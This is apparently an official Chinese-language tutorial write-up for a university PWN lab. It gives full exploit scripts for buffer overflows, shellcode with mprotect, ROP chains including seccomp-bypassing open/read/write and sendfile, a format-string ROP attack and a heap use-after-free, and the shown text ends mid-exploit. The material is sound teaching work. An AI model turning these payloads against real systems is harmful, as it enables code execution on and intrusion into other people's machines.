---
title: WriteUp - 二级信安实践 - PWN
date: 2023-07-01 23:14:55
tags:
  - WriteUp
  - tutorial
---

> [!done] 
> 二级信安实践 PWN 部分的官方题解，包括附加题。部分题目提供了多种解题思路。
>
> 实验的解题代码和附件已经公开在 [github 仓库](https://github.com/AvavaAYA/ustc-pwn-tutorial/tree/main/official-exp)中。

# 超安全的嗨客笔记

> [!hint] 
> 题目分为两小问，第一问需要溢出修改函数指针，第二问则需要 getshell.

## 缓冲区要被注满了

借助调试工具或者观察代码可以发现，函数指针 `void (*cmdtb[2])()` 在内存中的位置是紧贴在输入缓冲区下面的，而这里的输入函数存在缓冲区溢出：

```c
int get_a_num() {
  gets(input);
  return atoi(input);
}
```

本次实验的所有题目都提供了源码。事实上，使用 gcc 对源码进行编译或者使用现代编辑器（如配置了 LSP 的 [nvim](https://github.com/AvavaAYA/LianVim)）打开源码就可以发现漏洞所在：

![[static/isa-pic_0.png]]

不过这里溢出的是 .bss 段上的全局变量 input，这并不会影响到栈，这也是此题和后面讲到的栈溢出区别所在。

第一问只需要溢出到 cmdtb 上把程序劫持到后门函数 flag1 中即可，同时这个程序也没有开启地址随机化的保护，直接用调试中得到的函数地址偏移量即可，exp 关键部分如下：

```python
def cmd(data):
    ru(b"cmd> ")
    sl(data)


def call_func(data, idx=0, key=b""):
    cmd(data)
    ru(b"offset: ")
    sl(i2b(idx))
    if data[:1] == b"1":
        ru(b"data: ")
        sl(key)


ru(b":")
sl(input("YOUR TOKEN: ").encode())

# ===========exp starts===========
flag1_addr = 0x0000000000401FFA
call_func(b"-31\x00".ljust(8, b"\x00") + p64(flag1_addr), 0)
# ===========exp ends=============

ia()
```

我们通过 call_func 触发负数溢出调用到前面写进去的 flag1 的地址实现利用，其中 `-31 = -(0xf8 // 8)`。

## 该怎么 getshell 呢

第二问要求 getshell，即劫持控制流后实现任意代码执行的目标。根据实验教学顺序，我们这里先学习了 shellcode 的使用，讲义里也给出了 getshell 的 nasm 格式汇编代码：

```z80
mov rax, {bytes_binsh};
push rax;
mov rdi, rsp;
xor rsi, rsi;
xor rdx, rdx;
push SYS_execve;
pop rax;
syscall;
```

在 x86_64 架构下，进行函数调用需要先按照 rdi, rsi, rdx, rcx, r8, r9 的顺序将参数传入对应寄存器中，如这里把指向 `"/bin/sh\x00"` 字符串的指针放入 rdi，再将后面存放参数列表和函数列表的 rsi 和 rdx 置零。接下来需要把系统调用号传到 rax 中再执行 syscall。这样就能实现 getshell。

类似的，调用函数也需要先往寄存器中传参（如下面的调用 mprotect 函数）：正常安全的情况下，程序中是没有既能写又能执行的内存区域的，本题中我们已经能够利用溢出来调用 gets 等函数来往内存空间中读取 shellcode，但是这时候直接把控制流劫持上去（调用目标地址，使 rip 指向 shellcode 开始处的地址）会报段错误，这是因为程序运行到了没有 x（执行）权限的内存。关于内存的属性可以在 gdb+pwndbg 中用命令 vmmap 进行查看。

mprotect 是 libc 函数，可以设置目标地址的权限：

```c
#include <sys/mman.h>
int mprotect(void *addr, size_t len, int prot);
```

exp 关键部分如下，其中先利用溢出修改了函数指针列表，使我们能够自由控制 mprotect 函数的参数，接下来先用 gets 传入 shellcode，再用 mprotect 设置内存权限为 7（即 rwx，对本题来说 5 也可以，这里真正传入的是第三个参数的长度，因此是 b"a"\*7），最后调用 shellcode 成功 getshell：

```python
# ===========exp starts===========
buf_addr = 0x4c5000 + 8
#  gets_addr = elf.symbols['gets']
gets_addr = 0x418de0
#  mprotect_addr = elf.symbols['mprotect']
mprotect_addr = 0x452430
bytes_binsh = u64_ex(b"/bin/sh\x00")
call_func(b"0\x00".ljust(0xf8, b"\x00") + p64(buf_addr) + p64(gets_addr) + p64(mprotect_addr))
# -1 => shellcode
#  0 => gets
#  1 => mprotect

shellcode = b"a"*8
shellcode += asm(f"""
    // execve(b"/bin/sh\x00", 0, 0);
    mov rax, {bytes_binsh};
    push rax;
    mov rdi, rsp;
    xor rsi, rsi;
    xor rdx, rdx;
    push SYS_execve;
    pop rax;
    syscall;
""")
sl(shellcode)
call_func(i2b(1), 0x1000, b"a"*7)
call_func(i2b(-1))
# ===========exp ends=============
```

实际上还有很多生成各种各样 shellcode 的方法，如直接调用 pwntools 或 pwncli 提供的模块：

```python
# pwntools
asm(shellcraft.sh())
asm(shellcraft.cat("flag"))

# pwncli
ShellcodeMall.amd64.execve_bin_sh
```

有时候题目或真实环境也会对 shellcode 的字符种类或长度进行限制，例如生成仅包含可见字符的 shellcode 等，可以用 ALPHA3 等工具来得到这样的 shellcode。

---

# 一些 ROP

上面第一道题利用了函数指针数组中存在的漏洞实现了控制流劫持，因此在调用 mprotrct 等函数时只需要控制输入的内容即可，但是在更多情况下目标程序中并没有东西来帮我们传入函数/系统调用的参数，这时候就需要手动去布置寄存器。ROP 就是为了解决这个问题而被提出的：既然函数调用时参数取决于寄存器的值，那我们就可以用程序中现有片段去设置寄存器的值（`pop <reg>` 会把栈上 rsp 所指内容弹到寄存器中），而紧跟的一句 ret 实际上相当于 pop rip，会把 pc 寄存器设置为栈上的下一个值。

通过连续布置这样的 ROP 片段，就能控制函数/系统调用的参数。 

> [!caution] 
> 如果你想连续进行多个系统调用，请确保找到的 syscall 片段后面也跟着一句 ret。

对于 ROP-gadgets 的寻找，已经有很多工具了，如 ROPgadget，ropper，pwncli 等，甚至 objdump+文字编辑器就能胜任这一点。

## ret2text

对于第一小问，正如其名，只需要直接溢出后将栈上的返回地址改成 gift 的地址即可：

```python
# ===========exp starts===========
ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
payload += p64(0x401196)
s(payload)
# ===========exp ends=============
```

## 对齐栈试试

观察给出的第一小问源码可以发现，gift 函数中有一句很奇怪的内联汇编：

```c
asm("pop %rax");
```

按道理来说 getshell 不是只要调用 system("sh") 就行了吗？于是在第二小问中去掉了这句话，这时候可以发现一件很奇怪的事情：按照刚刚的思路来编写 exp，程序报错退出了。

> [!caution] 
> 这是栈没对齐导致的。

上一问的 pop rax 就是为了使调用 system 函数时栈对齐到 0x10。

面对这种情况，只需要在我们的 ROP 链前面加一句 ret 即可：

```python
# ===========exp starts===========
ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
payload += p64(0x40118c)
#  payload += p64(ret_addr)
payload += p64(0x00000000401196)
#  payload += p64(elf.symbols['gift'])
s(payload)
# ===========exp ends=============
```

## 这下没有 gift 了

没有 gift 函数，意味着我们要自己想办法构造出能够 getshell 的 ROP 链，参考我们之前编写过的 shellcode，只需要把相同的思路用 ROP 链的形式写一遍，其中 59 是 SYS_execve 的系统调用号：

```python
# ===========exp starts===========
syscall_ret = 0x0000000000416f34
pop_rdi_ret = 0x00000000004018c2
pop_rsi_ret = 0x000000000040f1fe
pop_rdx_ret = 0x00000000004017cf
pop_rax_ret = 0x0000000000449337
#  str_bin_sh  = next(elf.search(b"/bin/sh\x00"))
str_bin_sh  = 0x00495004

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8)
payload += p64(pop_rdi_ret) + p64(str_bin_sh)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(59)
payload += p64(syscall_ret)
s(payload)
# ===========exp ends=============
```

## 还能 getshell 吗

第四问题目中加了禁用 execve 的限制，可以用 seccomp-tools 来进行检测：

```shell
❯ seccomp-tools dump ./ret2text-rev-rev-rev
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

同时 main 函数中也增加了一个变量，我们栈溢出的 padding 不再是 0x20 而是 0x30 了，这点需要注意一下。

这时候我们是不能再 getshell 的：提示中给出这道题的思路为 orw，即连续使用 open+read+write 的系统/函数调用来把 flag 读出来，标准思路如下：

```python
# ===========exp starts===========
syscall_ret = 0x0000000000425E04
pop_rdi_ret = 0x00000000004018C2
pop_rsi_ret = 0x0000000000402828
pop_rdx_ret = 0x00000000004017CF
pop_rax_ret = 0x00000000004583C7
#  str_flag    = next(elf.search(b"/home/task3/flag4\x00"))
str_flag = 0x004A4019
buf_addr = 0x4DF000 + 0x800

#  ru(b'Give me your data: \n')
payload = b"a" * (0x20 + 8 + 0x10)

#  open("/flag", 0, 0);
payload += p64(pop_rdi_ret) + p64(str_flag)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(2)
payload += p64(syscall_ret)

#  read(3, buf, 0x40);
payload += p64(pop_rdi_ret) + p64(3)
payload += p64(pop_rsi_ret) + p64(buf_addr)
payload += p64(pop_rdx_ret) + p64(0x40)
payload += p64(pop_rax_ret) + p64(0)
payload += p64(syscall_ret)

#  write(1, buf, 0x40)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rax_ret) + p64(1)
payload += p64(syscall_ret)

s(payload)
# ===========exp ends=============
```

其中有几个值得注意的点：

- 漏洞程序的代码逻辑很简单，也没有额外打开其他的文件，因此可以确定 open 后得到的 fd 为 3（0,1,2 分别对应 stdin,stdout,stderr）。
- 我们需要找到一块地方作为缓冲区来存放我们读到的 flag，这需要确定一块可读可写的地址，可以通过 vmmap 来找到这样的地址（通常 .bss 段就满足要求）。
- 栈溢出的大小是有限的，这时候就要精简我们的 ROP 链，思路包括：使用一个参数的 gets/puts 函数来替代 read 和 write、系统调用前后参数寄存器的值不发生改变故去掉重复传入的 addr 和 length 参数（上面就采用了这个思路）、栈迁移等。

接下来看看本题的其他有趣的解法，不过由于长度限制，我们都需要先进行栈迁移：

即利用 `leave; ret`，这是一种常用的栈迁移技术，通常用于在栈溢出漏洞中执行攻击代码。它利用了函数调用栈的恢复机制，以实现将程序的控制流转移到攻击者所控制的恶意代码位置。

"leave" 指令是 x86 架构汇编语言中的一条指令，它用于函数的出口操作。它的作用是将栈帧恢复到调用者的栈帧状态，并将栈指针（Stack Pointer，ESP）设置为基址指针（Base Pointer，EBP）的值，相当于执行了以下指令序列：

```z80
mov esp, ebp
pop ebp
```

"ret" 指令用于函数返回操作，它从调用栈中弹出返回地址，将程序的控制流转移到该地址处执行。

下面演示了本题使用 sendfile 的解法。先把栈迁移到可控区域，用 read 函数来读取 0xdeadbeef 个字符（足够长即可），接下来就可以传入任意的 ROP gadget，由于 sendfile 会记录当前读到的字符，所以只需要重复调用即可：

```python
syscall_ret = 0x0000000000425e04
pop_rdi_ret = 0x00000000004018c2
pop_rsi_ret = 0x0000000000402828
pop_rdx_ret = 0x00000000004017cf
pop_rax_ret = 0x00000000004583c7
str_flag    = next(elf.search(b"/home/task3/flag4\x00"))
lg("str_flag")
buf_addr    = 0x4df000+0x800

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8+0x10 - 8)
payload += p64(buf_addr)

payload += p64(pop_rdx_ret) + p64(0xdeadbeef)
payload += p64(pop_rsi_ret) + p64(buf_addr-0x30)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(0x401e28)

s(payload)

import time
time.sleep(1)

payload = b"a"*0x30 + p64(buf_addr-0x30)
payload += p64(pop_rdi_ret) + p64(str_flag)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(2)
payload += p64(syscall_ret)
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rsi_ret) + p64(3)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(0x28)
payload += p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
payload += p64(pop_rax_ret) + p64(0x28) + p64(syscall_ret)
s(payload)
```

同时由于是静态编译，这道题中也可以找到 mprotect 函数，于是就可以栈迁移后像第一题一样传入 catflag 的 shellcode 即可：

```python
syscall_ret = 0x0000000000425e04
pop_rdi_ret = 0x00000000004018c2
pop_rsi_ret = 0x0000000000402828
pop_rdx_ret = 0x00000000004017cf
pop_rax_ret = 0x00000000004583c7
str_flag    = next(elf.search(b"/home/task3/flag4\x00"))
lg("str_flag")
buf_addr    = 0x4df000+0x800

ru(b'Give me your data: \n')
payload = b"a"*(0x20+8+0x10 - 8)
payload += p64(buf_addr)

payload += p64(pop_rdx_ret) + p64(0xdeadbeef)
payload += p64(pop_rsi_ret) + p64(buf_addr-0x30)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(0x401e28)

s(payload)

import time
time.sleep(1)

shellcode_addr = 0x4df000 + 0x800 + 0x500
payload = b"a"*0x30 + p64(buf_addr-0x30)
payload += p64(pop_rdx_ret) + p64(7)
payload += p64(pop_rsi_ret) + p64(0x1000)
payload += p64(pop_rdi_ret) + p64(buf_addr & 0xffffffff000)
payload += p64(elf.sym["mprotect"])
payload += p64(shellcode_addr)
payload = payload.ljust((shellcode_addr-(buf_addr-0x30)), b"\x00")
payload += asm(r"""
    /* push b'/home/task3/flag4\x00' */
    push 0x34
    mov rax, 0x67616c662f336b73
    push rax
    mov rax, 0x61742f656d6f682f
    push rax
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push SYS_open /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    syscall
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push SYS_sendfile /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    syscall
""")
s(payload)
```

---

# 你的名字2

这是一道格式化字符串的题目，也是我们第一道保护全开的题目，不过由于格式化字符串的存在，利用起来思路并不复杂：提示中给出了用于生成 %x$hhn 的函数，因此只需要布置好栈上指向目标地址的指针，进而布置 ROP 链即可：

```python
# ===========exp starts===========
current_n = 0
def generate_hhn_payload(distance, hhn_data):
    global current_n
    offset = (distance // 8) + 6
    if hhn_data > current_n:
        temp = hhn_data - current_n
    elif hhn_data < current_n:
        temp = 0x100 - current_n + hhn_data
    elif hhn_data == current_n:
        return b"%" + i2b(offset) + b"hhn"
    current_n = hhn_data
    return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"

ru(b":")
sl(input("YOUR TOKEN: ").encode())

ru(b"What's your name?\n");
current_n = 0
payload = b"%40$p.%41$p.%43$p."
sl(payload)
#  input()
stack_buf = int(ru(b".", "drop"), 16) - 0x120
elf_base  = int(ru(b".", "drop"), 16) - 0x1307
libc_base = int(ru(b".", "drop"), 16) - 0x29d90
lg("stack_buf")
lg("elf_base")
lg("libc_base")
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)

pop_rdi_ret = libc_base + 0x000000000002a3e5
ret_addr    = pop_rdi_ret + 1
bin_sh_str  = libc_base + 0x1d8698
system_addr = libc_base + 331104
#  bin_sh_str  = libc_base + next(libc.search(b"/bin/sh\x00"))
#  system_addr = libc_base + libc.sym.system

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload = generate_hhn_payload(0xc0,  ( (pop_rdi_ret) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (pop_rdi_ret >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (pop_rdi_ret >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (pop_rdi_ret >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (pop_rdi_ret >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (pop_rdi_ret >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 8 + 0x118)
payload += p64(stack_buf + 8 + 0x119)
payload += p64(stack_buf + 8 + 0x11a)
payload += p64(stack_buf + 8 + 0x11b)
payload += p64(stack_buf + 8 + 0x11c)
payload += p64(stack_buf + 8 + 0x11d)
sl(payload)

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((bin_sh_str) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (bin_sh_str >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (bin_sh_str >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (bin_sh_str >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (bin_sh_str >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (bin_sh_str >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 16 + 0x118)
payload += p64(stack_buf + 16 + 0x119)
payload += p64(stack_buf + 16 + 0x11a)
payload += p64(stack_buf + 16 + 0x11b)
payload += p64(stack_buf + 16 + 0x11c)
payload += p64(stack_buf + 16 + 0x11d)
sl(payload)

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((system_addr) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (system_addr >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (system_addr >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (system_addr >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (system_addr >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (system_addr >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 24 + 0x118)
payload += p64(stack_buf + 24 + 0x119)
payload += p64(stack_buf + 24 + 0x11a)
payload += p64(stack_buf + 24 + 0x11b)
payload += p64(stack_buf + 24 + 0x11c)
payload += p64(stack_buf + 24 + 0x11d)
sl(payload)

ru(b"What's your name?\n");
current_n = 0
payload = generate_hhn_payload(0xc0, 2)
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0x118)
sl(payload)
ru(b'? Why is your name so strange? I want your real name!!\n')
current_n = 0
payload =  generate_hhn_payload(0xc0,  ((ret_addr) & 0xff ) )
payload += generate_hhn_payload(0xc8, ( (ret_addr >> 8) & 0xff ) )
payload += generate_hhn_payload(0xd0, ( (ret_addr >> 16) & 0xff ))
payload += generate_hhn_payload(0xd8, ( (ret_addr >> 24) & 0xff ))
payload += generate_hhn_payload(0xe0, ( (ret_addr >> 32) & 0xff ))
payload += generate_hhn_payload(0xe8, ( (ret_addr >> 40) & 0xff ))
payload = payload.ljust(0xc0, b"\x00")
payload += p64(stack_buf + 0 + 0x118)
payload += p64(stack_buf + 0 + 0x119)
payload += p64(stack_buf + 0 + 0x11a)
payload += p64(stack_buf + 0 + 0x11b)
payload += p64(stack_buf + 0 + 0x11c)
payload += p64(stack_buf + 0 + 0x11d)
sl(payload)
# ===========exp ends=============
```

其实 libc 中也存在 `ONE_GADGET`，即直接 getshell 的代码片段，感兴趣的同学可以自行了解。

---

# 编译原理大作业

这是一道为了体现我们科大网安的编译原理h水平而出的附加题（并不算分），其实只是用 llvm pass 来包装了一下原本放在这里的一道堆题，漏洞出现在 FunctionPass 中处理函数名为 qiaoKe 时的 free 后未置零（即 UAF）：

```c
if (Name == "qiaoKe") {
    // delet
    if (arg_count != 2) {
        return false;
    }
    unsigned int stu_id = dyn_cast<ConstantInt>(inst->getArgOperand(0))->getZExtValue();
    if (stu_id >= 0x10 || !studentList[stu_id]){
        return false;
    }
    free(studentList[stu_id]);
    // studentList[stu_id] = 0;
}
```

用的 libc 版本是 2.31，于是可以直接用 unsorted bin 获得 libc 地址，用 tcache 打 malloc hook 即可。

使用 `clang-10 -emit-llvm ./exp.c -S -o ./exp.ll` 得到 ll 代码，使用 `./opt-10 -load ./bianYiYuanLiXiTiKe.so -bianYiYuanLiXiTiKe /root/workspace/ustc-pwn-tutorial/attachments/chp4/chpe-0/exp.ll` 本地运行测试。

利用代码如下：

```c
#define ONE_GADGET 0xe3afe
#define MAIN_ARE_OFF 0x1ecbe0
#define MALLOC_HOOK 0x1ecb70

void qiaoKe(int);
void dianMing(char *, int);
void daBian(int);
void xiaoCe(int);
void add(int, long);
void mov(int, int);
void classBegin() {
  dianMing(
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      0);
  dianMing(
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
